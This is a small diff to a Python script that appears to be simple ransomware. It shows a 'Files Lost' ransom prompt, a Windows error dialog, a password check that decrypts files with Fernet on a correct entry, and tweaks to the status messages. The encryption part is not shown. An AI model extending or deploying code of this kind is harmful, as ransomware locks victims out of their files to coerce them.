@@ -196,7 +196,6 @@ call(["python", "FailSafe.py"])
 
 userInput = input("Files Lost\n")
 time.sleep(2)
-print("Failed to decript")
 ctypes.windll.user32.MessageBoxW(0, "Files Lost", "Computer", 16)
 
 # Checking the password that the user put in, if its right the user will get a message saying the files are decrypted 
@@ -208,7 +207,7 @@ if userInput == password:
 		contents_decrypted = Fernet(secretkey).decrypt(contents)
 		with open(file, "wb") as thefile:
 			thefile.write(contents_decrypted)
-	print("Your files are decrypted!")
+	print("Restart your PC")
 
 else:
 	print("Restarting your PC")
